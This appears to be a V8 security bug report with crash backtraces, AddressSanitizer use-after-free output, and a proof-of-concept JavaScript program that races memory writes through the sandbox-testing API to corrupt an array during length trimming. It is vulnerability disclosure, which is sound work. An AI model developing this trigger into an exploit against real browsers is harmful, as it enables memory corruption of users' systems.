#15 heap::base::BasicSlotSet<4ul>::Iterate<(heap::base::BasicSlotSet<4ul>::AccessMode)0, v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::{lambda(v8::internal::CompressedMaybeObjectSlot)#1}>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::{lambda(v8::internal::CompressedMaybeObjectSlot)#1}, heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::{lambda(unsigned long)#1}, v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::{lambda(v8::internal::CompressedMaybeObjectSlot)#1}>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::{lambda(v8::internal::CompressedMaybeObjectSlot)#1}, heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::{lambda(unsigned long)#2}>(unsigned long, unsigned long, unsigned long, v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::{lambda(v8::internal::CompressedMaybeObjectSlot)#1}>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::{lambda(v8::internal::CompressedMaybeObjectSlot)#1}, heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::{lambda(unsigned long)#1}, v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::{lambda(v8::internal::CompressedMaybeObjectSlot)#1}>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::{lambda(v8::internal::CompressedMaybeObjectSlot)#1}, heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::{lambda(unsigned long)#2}) (this=this@entry=0x7d5ff71e1588, chunk_start=chunk_start@entry=134956464209920, start_bucket=start_bucket@entry=4, end_bucket=end_bucket@entry=4503599627104532, callback=callback@entry=..., empty_bucket_callback=...) at ../../v8/src/heap/base/basic-slot-set.h:347
        bucket = <optimized out>
        bucket_index = 64
        new_count = 0
#16 0x000055555923477c in v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::{lambda(v8::internal::CompressedMaybeObjectSlot)#1}>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::{lambda(v8::internal::CompressedMaybeObjectSlot)#1}, heap::base::BasicSlotSet<4ul>::EmptyBucketMode) (this=0x7d5ff71e1588, chunk_start=134956464209920, start_bucket=4, end_bucket=4503599627104532, callback=..., mode=heap::base::BasicSlotSet<4>::KEEP_EMPTY_BUCKETS) at ../../v8/src/heap/slot-set.h:154
No locals.
#17 v8::internal::RememberedSetOperations::CheckNoneInRange (slot_set=0x7d5ff71e1588, chunk=0x7abe001c0000, start=start@entry=134956464229736, end=end@entry=134955374818184) at ../../v8/src/heap/remembered-set.h:80
        start_bucket = 4
        end_bucket = 4503599627104532
#18 0x000055555919aba6 in v8::internal::RememberedSet<(v8::internal::RememberedSetType)0>::CheckNoneInRange (page=0x7e4ff7246900, start=134956464229736, end=134955374818184) at ../../v8/src/heap/remembered-set.h:155
        slot_set = 0x16754
#19 v8::internal::Heap::VerifySlotRangeHasNoRecordedSlots (start=134956464229736, end=134955374818184, this=<optimized out>) at ../../v8/src/heap/heap.cc:6608
        page = 0x7e4ff7246900
#20 v8::internal::(anonymous namespace)::VerifyNoNeedToClearSlots (start=134956464229736, end=134955374818184) at ../../v8/src/heap/heap.cc:3330
        chunk = <optimized out>
        space = <optimized out>
        mutable_page = <optimized out>
#21 v8::internal::Heap::CreateFillerObjectAtRaw (this=this@entry=0x7f0ff71efdb8, free_space=..., clear_memory_mode=clear_memory_mode@entry=v8::internal::ClearFreedMemoryMode::kDontClearFreedMemory, clear_slots_mode=clear_slots_mode@entry=v8::internal::ClearRecordedSlots::kNo, verify_no_slots_recorded=v8::internal::Heap::VerifyNoSlotsRecorded::kYes) at ../../v8/src/heap/heap.cc:3379
        size = <optimized out>
        addr = 134956464229736
#22 0x0000555559163fc5 in v8::internal::Heap::NotifyObjectSizeChange (this=<optimized out>, object=..., old_size=-1089207320, new_size=204232, clear_recorded_slots=<optimized out>) at ../../v8/src/heap/heap.cc:4238
        is_main_thread = <optimized out>
        clear_memory_mode = v8::internal::ClearFreedMemoryMode::kDontClearFreedMemory
        filler = <optimized out>
        verify_no_slots_recorded = <optimized out>
        filler_size = <optimized out>
#23 0x0000555559164c3f in v8::internal::Heap::RightTrimArray<v8::internal::FixedDoubleArray> (this=0x7f0ff71efdb8, object=..., new_capacity=25528, old_capacity=<optimized out>) at ../../v8/src/heap/heap.cc:3618
        bytes_to_trim = -1089411552
        old_size = -1089207320
        old_end = <optimized out>
        new_end = <optimized out>
        clear_slots = <optimized out>
#24 0x0000555559c537d9 in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4> >::SetLengthImpl (isolate=0x7f0ff71e1000, array=..., length=25528, backing_store=...) at ../../v8/src/objects/elements.cc:869
        old_length = 124
        capacity = <optimized out>
#25 v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4> >::SetLength (this=<optimized out>, isolate=<optimized out>, array=..., length=<optimized out>) at ../../v8/src/objects/elements.cc:817
No locals.
#26 0x000055555a2df2c3 in v8::internal::JSArray::SetLength (isolate=<optimized out>, array=..., new_length=<optimized out>) at ../../v8/src/objects/objects.cc:4875
No locals.
#27 0x00005555585ee288 in v8::internal::Accessors::ArrayLengthSetter (name=..., val=..., info=...) at ../../v8/src/builtins/accessors.cc:209
        rcs_timer_scope173 = <optimized out>
        length = 25528
        isolate = 0x7f0ff71e1000
        scope = {static kCheckHandleThreshold = 30720, isolate_ = 0x7f0ff71e1000, prev_next_ = 0x7e4ff71ed028, prev_limit_ = 0x7e4ff71ee8f0}
        object = {<v8::api_internal::StackAllocated<0>> = {static do_not_check = <optimized out>}, handle_ = {<v8::internal::HandleBase> = {location_ = 0x7bfff624d688}, <No data fields>}}
        array = {<v8::api_internal::StackAllocated<0>> = {static do_not_check = <optimized out>}, handle_ = {<v8::internal::HandleBase> = {location_ = 0x7bfff624d688}, <No data fields>}}
        length_obj = {<v8::api_internal::StackAllocated<0>> = {static do_not_check = <optimized out>}, handle_ = {<v8::internal::HandleBase> = {location_ = 0x7fffffffcfb0}, <No data fields>}}
        was_readonly = <optimized out>
        actual_new_len = <optimized out>
#28 0x000055555a031cbd in v8::internal::PropertyCallbackArguments::CallAccessorSetter (this=0x7bfff624d660, accessor_info=..., name=..., value=...) at ../../v8/src/api/api-arguments-inl.h:460
        rcs_timer_scope439 = <optimized out>
        isolate = 0x7f0ff71e1000
        f = 0x5555585edc60 <v8::internal::Accessors::ArrayLengthSetter(v8::Local<v8::Name>, v8::Local<v8::Value>, v8::PropertyCallbackInfo<v8::Boolean> const&)>
        callback_info = @0x7bfff624d678: {static kPropertyKeyIndex = <optimized out>, static kShouldThrowOnErrorIndex = <optimized out>, static kHolderIndex = <optimized out>, static kIsolateIndex = <optimized out>, static kHolderV2Index = <optimized out>, static kReturnValueIndex = <optimized out>, static kDataIndex = <optimized out>, static kThisIndex = <optimized out>, static kArgsLength = <optimized out>, static kSize = <optimized out>, args_ = {134956462378469, 4, 134956464025481, 139706547179520, 0, 134956462375025, 134956462374929, 134956464025481}}
        result = <optimized out>
        call_scope = <optimized out>
#29 0x000055555a2c4f2d in v8::internal::Object::SetPropertyWithAccessor (it=0x7bfff624d550, value=..., maybe_should_throw=...) at ../../v8/src/objects/objects.cc:1620
        name = {<v8::api_internal::StackAllocated<0>> = {static do_not_check = <optimized out>}, handle_ = {<v8::internal::HandleBase> = {location_ = 0x7fffffffcf90}, <No data fields>}}
        info = {<v8::api_internal::StackAllocated<0>> = {static do_not_check = <optimized out>}, handle_ = {<v8::internal::HandleBase> = {location_ = 0x7e4ff71ed020}, <No data fields>}}
        args = <optimized out>
        result = <optimized out>
        isolate = 0x7f0ff71e1000
        structure = {<v8::api_internal::StackAllocated<0>> = {static do_not_check = <optimized out>}, handle_ = {<v8::internal::HandleBase> = {location_ = 0x7e4ff71ed020}, <No data fields>}}
        receiver = {<v8::api_internal::StackAllocated<0>> = {static do_not_check = <optimized out>}, handle_ = {<v8::internal::HandleBase> = {location_ = 0x7fffffffcf98}, <No data fields>}}
        holder = {<v8::api_internal::StackAllocated<0>> = {static do_not_check = <optimized out>}, handle_ = {<v8::internal::HandleBase> = {location_ = 0x7fffffffcf98}, <No data fields>}}
        setter = <optimized out>
#30 0x000055555a2d03a8 in v8::internal::Object::SetPropertyInternal (it=0x7bfff624d550, value=..., should_throw=..., store_origin=<optimized out>, found=<optimized out>) at ../../v8/src/objects/objects.cc:2371
        accessors = <optimized out>
        ncc = <optimized out>
#31 0x000055555a2cf8dd in v8::internal::Object::SetProperty (it=0x7bfff624d550, value=..., store_origin=v8::internal::StoreOrigin::kNamed, should_throw=...) at ../../v8/src/objects/objects.cc:2466
        found = true
        result = <optimized out>
#32 0x0000555559fe660b in v8::internal::StoreIC::Store (this=0x7bfff624d240, object=..., name=..., value=..., store_origin=<optimized out>) at ../../v8/src/ic/ic.cc:1975
        key = <optimized out>
        it = <optimized out>
        use_ic = true
        original_state = v8::internal::LookupIterator::ACCESSOR
#33 0x000055555a0017b9 in v8::internal::__RT_impl_Runtime_StoreIC_Miss (args=..., isolate=0x7f0ff71e1000) at ../../v8/src/ic/ic.cc:2968
        __result__ = {<v8::api_internal::StackAllocated<0>> = {static do_not_check = <optimized out>}, handle_ = {<v8::internal::HandleBase> = {location_ = 0x0}, <No data fields>}}
        __isolate__ = 0x7f0ff71e1000
        ic = <optimized out>
        scope = {static kCheckHandleThreshold = 30720, isolate_ = 0x7f0ff71e1000, prev_next_ = 0x7e4ff71ecfe8, prev_limit_ = 0x7e4ff71ecfe8}
        slot = <optimized out>
        maybe_vector = {<v8::internal::HandleBase> = {location_ = 0x7fffffffcfa0}, <No data fields>}
        receiver = {<v8::internal::HandleBase> = {location_ = 0x7fffffffcf98}, <No data fields>}
        key = {<v8::internal::HandleBase> = {location_ = 0x7fffffffcf90}, <No data fields>}
        vector_slot = {static kInvalidSlot = -1, id_ = 34}
        kind = <optimized out>
        vector = <optimized out>
        value = <optimized out>
#34 0x000055555a0006a9 in v8::internal::Runtime_StoreIC_Miss (args_length=5, args_object=0x7fffffffcfb0, isolate=0x7f0ff71e1000) at ../../v8/src/ic/ic.cc:2940
        args = {length_ = 5, arguments_ = 0x7fffffffcfb0}
#35 0x000055555f7d1abd in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit ()
No symbol table info available.
#36 0x000055555f9a5b14 in Builtins_SetNamedPropertyHandler ()
No symbol table info available.
#37 0x00007abe00000de5 in ?? ()
No symbol table info available.
#38 0x00007abe00192f89 in ?? ()
No symbol table info available.
#39 0x00007abe00062dc9 in ?? ()
No symbol table info available.
#40 0x0000000000000044 in ?? ()
No symbol table info available.
#41 0x000000000000c770 in ?? ()
No symbol table info available.
#42 0x00007fffffffd050 in ?? ()
No symbol table info available.
#43 0x00000000000000c2 in ?? ()
No symbol table info available.
#44 0x00007e2ff71e0110 in ?? ()
No symbol table info available.
#45 0x0000000000000022 in ?? ()
No symbol table info available.
#46 0x00007fffffffd050 in ?? ()
No symbol table info available.
#47 0x000055555f697863 in Builtins_InterpreterEntryTrampoline ()
No symbol table info available.
#48 0x00007abe00000071 in ?? ()
No symbol table info available.
#49 0x0000000000015f8a in ?? ()
No symbol table info available.
#50 0x0000000000325f4c in ?? ()
No symbol table info available.
#51 0x000000000000c770 in ?? ()
No symbol table info available.
#52 0x00007abe00192f89 in ?? ()
No symbol table info available.
#53 0x00007abe00005a49 in ?? ()
No symbol table info available.
#54 0x00007abe00005a49 in ?? ()
No symbol table info available.
#55 0x00007abe00062dc9 in ?? ()
No symbol table info available.
#56 0x0000000000000184 in ?? ()
No symbol table info available.
#57 0x00007ab4001000f1 in ?? ()
No symbol table info available.
#58 0x0000000000000001 in ?? ()
No symbol table info available.
#59 0x00007abe00062d3d in ?? ()
No symbol table info available.
#60 0x00007abe00062d7d in ?? ()
No symbol table info available.
#61 0x00007fffffffd078 in ?? ()
No symbol table info available.
#62 0x000055555f692ce7 in Builtins_JSEntryTrampoline ()
No symbol table info available.
#63 0x00007abe00048a6d in ?? ()
No symbol table info available.
#64 0x00007abe00062d3d in ?? ()
No symbol table info available.
#65 0x000000000000002c in ?? ()
No symbol table info available.
#66 0x00007fffffffd0f0 in ?? ()
No symbol table info available.
#67 0x000055555f692a2b in Builtins_JSEntry ()
No symbol table info available.
Backtrace stopped: previous frame inner to this frame (corrupt stack?)

```

CREDIT INFORMATION  

Reporter credit: David Hirsch

## Attachments

- [poc.js](attachments/poc.js) (text/javascript, 907 B)

## Timeline

### da...@hirsch.cx (2025-07-09)

On an additional note, the fuzzer initially detected an use after free:

```
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3594: new_capacity < old_capacity (25528 vs. -34209250)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 4222: new_size <= old_size (204232 vs. -273673992)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3306: size > 2 * kTaggedSize (-273878224 vs. 8)
# Ignoring debug check failure in ../../v8/src/objects/free-space-inl.h, line 30: size > 2 * kTaggedSize (-273878224 vs. 8)
=================================================================
==561548==ERROR: AddressSanitizer: heap-use-after-free on address 0x7d0ff70f4408 at pc 0x55555915d4e8 bp 0x7fffffffd5a0 sp 0x7fffffffd598
READ of size 8 at 0x7d0ff70f4408 thread T0
    #0 0x55555915d4e7 in v8::internal::Heap::CreateFillerObjectAtRaw(v8::internal::WritableFreeSpace const&, v8::internal::ClearFreedMemoryMode, v8::internal::ClearRecordedSlots, v8::internal::Heap::VerifyNoSlotsRecorded) heap.cc:0:0
    #1 0x555559125fc4 in v8::internal::Heap::NotifyObjectSizeChange(v8::internal::Tagged<v8::internal::HeapObject>, int, int, v8::internal::ClearRecordedSlots) heap.cc:0:0
    #2 0x555559126c3e in void v8::internal::Heap::RightTrimArray<v8::internal::FixedDoubleArray>(v8::internal::Tagged<v8::internal::FixedDoubleArray>, int, int) heap.cc:0:0
    #3 0x555559c157d8 in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) elements.cc:0:0
    #4 0x55555a2a12b2 in v8::internal::JSArray::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) objects.cc:0:0
    #5 0x5555585b0287 in v8::internal::Accessors::ArrayLengthSetter(v8::Local<v8::Name>, v8::Local<v8::Value>, v8::PropertyCallbackInfo<v8::Boolean> const&) accessors.cc:0:0
    #6 0x555559ff3cac in v8::internal::PropertyCallbackArguments::CallAccessorSetter(v8::internal::DirectHandle<v8::internal::AccessorInfo>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>) ic.cc:0:0
    #7 0x55555a286f1c in v8::internal::Object::SetPropertyWithAccessor(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>) objects.cc:0:0
    #8 0x55555a292397 in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, bool*) objects.cc:0:0
    #9 0x55555a2918cc in v8::internal::Object::SetProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin, v8::Maybe<v8::internal::ShouldThrow>) objects.cc:0:0
    #10 0x555559fa85fa in v8::internal::StoreIC::Store(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::Handle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin) ic.cc:0:0
    #11 0x555559fc37a8 in v8::internal::__RT_impl_Runtime_StoreIC_Miss(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*) ic.cc:0:0
    #12 0x555559fc2698 in v8::internal::Runtime_StoreIC_Miss(int, unsigned long*, v8::internal::Isolate*) ic.cc:0:0
    #13 0x55555f793abc in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc:0:0
    #14 0x55555f967b13 in Builtins_SetNamedPropertyHandler setup-isolate-deserialize.cc:0:0
    #15 0x55555f659862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc:0:0
    #16 0x55555f659862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc:0:0
    #17 0x55555f654ce6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc:0:0
    #18 0x55555f654a2a in Builtins_JSEntry setup-isolate-deserialize.cc:0:0
    #19 0x555558cf70c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) execution.cc:0:0
    #20 0x555558cfb229 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) execution.cc:0:0
    #21 0x555558496578 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) api.cc:0:0
    #22 0x555557b10b61 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) d8.cc:0:0
    #23 0x555557b4a127 in v8::SourceGroup::Execute(v8::Isolate*) d8.cc:0:0
    #24 0x555557b57631 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) d8.cc:0:0
    #25 0x555557b5663e in v8::Shell::RunMain(v8::Isolate*, bool) d8.cc:0:0
    #26 0x555557b5aca8 in v8::Shell::Main(int, char**) d8.cc:0:0
    #27 0x7ffff7c961c9 in __gconv_get_alias_db ??:?
    #28 0x7ffff7c9628a in __gconv_get_alias_db ??:?
    #29 0x5555579f1029 in _start ??:0:0

0x7d0ff70f4408 is located 8 bytes inside of 200-byte region [0x7d0ff70f4400,0x7d0ff70f44c8)
freed by thread T1 (WorkerThread) here:
    #0 0x555557a92396 in __interceptor_free _asan_rtl_:3
    #1 0x555559177201 in v8::internal::Heap::TearDown() heap.cc:0:0
    #2 0x555558d8303a in v8::internal::Isolate::Deinit() isolate.cc:0:0
    #3 0x555558d81a91 in v8::internal::Isolate::Deinitialize(v8::internal::Isolate*) isolate.cc:0:0
    #4 0x555558d818bc in v8::internal::Isolate::Delete(v8::internal::Isolate*) isolate.cc:0:0
    #5 0x555557b4eba6 in v8::Worker::ExecuteInThread() d8.cc:0:0
    #6 0x555557b4d77c in v8::Worker::WorkerThread::Run() d8.cc:0:0
    #7 0x555558452952 in v8::base::ThreadEntry(void*) platform-posix.cc:0:0
    #8 0x555557a8ff86 in asan_thread_start(void*) _asan_rtl_:28

previously allocated by thread T1 (WorkerThread) here:
    #0 0x555557a92634 in __interceptor_malloc _asan_rtl_:3
    #1 0x55555abc71dd in v8::internal::Malloced::operator new(unsigned long) allocation.cc:0:0
    #2 0x5555591716c8 in v8::internal::Heap::SetUpSpaces(v8::internal::LinearAllocationArea&, v8::internal::LinearAllocationArea&) heap.cc:0:0
    #3 0x555558d95643 in v8::internal::Isolate::Init(v8::internal::SnapshotData*, v8::internal::SnapshotData*, v8::internal::SnapshotData*, bool) isolate.cc:0:0
    #4 0x555558d9aa04 in v8::internal::Isolate::InitWithSnapshot(v8::internal::SnapshotData*, v8::internal::SnapshotData*, v8::internal::SnapshotData*, bool) isolate.cc:0:0
    #5 0x55555ab43217 in v8::internal::Snapshot::Initialize(v8::internal::Isolate*) snapshot.cc:0:0
    #6 0x555558513200 in v8::Isolate::Initialize(v8::Isolate*, v8::Isolate::CreateParams const&) api.cc:0:0
    #7 0x5555585143dd in v8::Isolate::New(v8::Isolate::CreateParams const&) api.cc:0:0
    #8 0x555557b4da0e in v8::Worker::ExecuteInThread() d8.cc:0:0
    #9 0x555557b4d77c in v8::Worker::WorkerThread::Run() d8.cc:0:0
    #10 0x555558452952 in v8::base::ThreadEntry(void*) platform-posix.cc:0:0
    #11 0x555557a8ff86 in asan_thread_start(void*) _asan_rtl_:28

Thread T1 (WorkerThread) created by T0 here:
    #0 0x555557a76871 in ___interceptor_pthread_create _asan_rtl_:3
    #1 0x555558452681 in v8::base::Thread::Start() platform-posix.cc:0:0
    #2 0x555557b39dd7 in v8::Worker::StartWorkerThread(v8::Isolate*, std::__Cr::shared_ptr<v8::Worker>, v8::base::Thread::Priority) d8.cc:0:0
    #3 0x555557b3935b in v8::Shell::WorkerNew(v8::FunctionCallbackInfo<v8::Value> const&) d8.cc:0:0
    #4 0x5555585d9aa1 in v8::internal::FunctionCallbackArguments::CallOrConstruct(v8::internal::Tagged<v8::internal::FunctionTemplateInfo>, bool) builtins-api.cc:0:0
    #5 0x5555585d543e in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::HeapObject>, v8::internal::DirectHandle<v8::internal::FunctionTemplateInfo>, v8::internal::DirectHandle<v8::internal::Object>, unsigned long*, int) builtins-api.cc:0:0
    #6 0x5555585d2195 in v8::internal::Builtin_Impl_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate*) builtins-api.cc:0:0
    #7 0x5555585d1117 in v8::internal::Builtin_HandleApiConstruct(int, unsigned long*, v8::internal::Isolate*) builtins-api.cc:0:0
    #8 0x55555f7939bc in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc:0:0
    #9 0x55555f65a381 in Builtins_InterpreterPushArgsThenFastConstructFunction setup-isolate-deserialize.cc:0:0
    #10 0x55555f9816bc in Builtins_ConstructHandler setup-isolate-deserialize.cc:0:0
    #11 0x55555f659862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc:0:0
    #12 0x55555f654ce6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc:0:0
    #13 0x55555f654a2a in Builtins_JSEntry setup-isolate-deserialize.cc:0:0
    #14 0x555558cf70c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) execution.cc:0:0
    #15 0x555558cfb229 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) execution.cc:0:0
    #16 0x555558496578 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) api.cc:0:0
    #17 0x555557b10b61 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) d8.cc:0:0
    #18 0x555557b4a127 in v8::SourceGroup::Execute(v8::Isolate*) d8.cc:0:0
    #19 0x555557b57631 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) d8.cc:0:0
    #20 0x555557b5663e in v8::Shell::RunMain(v8::Isolate*, bool) d8.cc:0:0
    #21 0x555557b5aca8 in v8::Shell::Main(int, char**) d8.cc:0:0
    #22 0x7ffff7c961c9 in __gconv_get_alias_db ??:?
    #23 0x7ffff7c9628a in __gconv_get_alias_db ??:?
    #24 0x5555579f1029 in _start ??:0:0

SUMMARY: AddressSanitizer: heap-use-after-free (/home/david/chrome/d/src/out/fuzzbuild/d8+0x3c094e7) (BuildId: 95b6b8820e037a5f)
Shadow bytes around the buggy address:
  0x7d0ff70f4180: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7d0ff70f4200: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa
  0x7d0ff70f4280: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x7d0ff70f4300: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7d0ff70f4380: fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa
=>0x7d0ff70f4400: fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7d0ff70f4480: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa
  0x7d0ff70f4500: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x7d0ff70f4580: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7d0ff70f4600: fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d0ff70f4680: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
==561548==ABORTING

## V8 sandbox violation detected!

```

Unfortunately, I was not able to reproduce this yet.

### cl...@appspot.gserviceaccount.com (2025-07-09)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6016857865650176.

### da...@hirsch.cx (2025-07-09)

I was finally able to reproduce the use-after-free with the following program:

```
function workerTemplate(addr) {
    const sbx = new DataView(new Sandbox.MemoryView(0, 4294967296));
    const oldValue = sbx.getInt16(addr, true);
    while (true) {
        sbx.setInt16(addr, 0xafc5, true);
        sbx.setInt16(addr, oldValue, true);
    }
}

function f13(a14) {
    for (let i = 0; i<300000;) {
        i++;
    }
}

new Worker(f13, { type: "function" });
const v23 = [6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,609266,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824];
new Worker(workerTemplate, { type: 'function', arguments: [Sandbox.getAddressOf(v23) + 30] });
for (let i = 0; i<600000000;) {
    i++;
}
v23.length &&= 25527;

```

This reproduces flaky and the delay by the for loops might need some adjustment.
Still, I was able to capture a properly symbolized ASAN stacktrace:

```
ASAN_OPTIONS="halt_on_error=false:abort_on_error=false:redzone=16:max_redzone=32:thread_local_quarantine_size_kb=1:quarantine_size_mb=4096" ~/chrome/d/src/out/fuzzbuild-with-symbols/d8 --jit-fuzzing --sandbox-testing ./program_20250709082216_F7D55EBB-18CA-45F7-82B8-E5BAC8070493_deterministic.js.UAF
[COV] no shared memory bitmap available, skipping
[COV] edge counters initialized. Shared memory: (null) with 1595718 edges
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3594: new_capacity < old_capacity (25527 vs. -673021702)
